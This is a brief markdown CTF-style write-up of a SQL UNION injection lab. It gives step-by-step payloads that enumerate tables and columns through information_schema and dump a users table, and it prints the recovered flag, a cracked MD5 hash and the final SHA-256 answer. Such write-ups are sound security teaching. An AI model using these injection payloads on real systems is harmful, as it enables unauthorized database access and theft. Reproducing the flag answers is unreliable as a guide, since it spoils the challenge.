# SQL UNION ATTACK
A union attack attempts to pull information from an additional table that is not the current table that is being queried.

### Step 1
> * Input is data search using ID's, try tentative search with integer and then without

### Step 2
> * Confirm SQL vulnerabitlity with 1 = 1 or 1

### Step 3
> * Attack
> 1. Confirm number off return columns and data types
 > * trial and error: 
> _1 = 1 or 1 ORDER BY 1_...  
> _UNION SELECT ‘a’,NULL_...
>
> 2. Find tables within current database  
 >_1 or 1 = 1 UNION SELECT 1,concat(table_name) FROM information_schema.tables WHERE table_schema = database()_
>
  >**users**
>
>3. Find columns within desired table  
 >_1 and 1=2 union select 1,group_concat(column_name) from information_schema.columns where table_schema = database()_
>
 >**user_id,first_name,last_name,town,country,planet,Commentaire,countersign**
>
>4. Find data  
 >_1 and 1=2 union select 1,concat(user_id,first_name,last_name,town,country,planet,Commentaire,countersign) from users_
>
 >**5FlagGetThe424242Decrypt this password -> then lower all the char. Sh256 on it and it's good !5ff9d0165b4f92b14994e5c685cdce28**
>
 >_MD5 DECRYPT-> 5ff9d0165b4f92b14994e5c685cdce28 => FortyTwo_
>
 > _toLower -> FortyTwo => fortytwo_
>
 >_Sh256 ENCRYPT -> fortytwo => **10a16d834f9b1e4068b25c4c46fe0284e99e44dceaf08098fc83925ba6310ff5**_

https://medium.com/@nyomanpradipta120/sql-injection-union-attack-9c10de1a5635
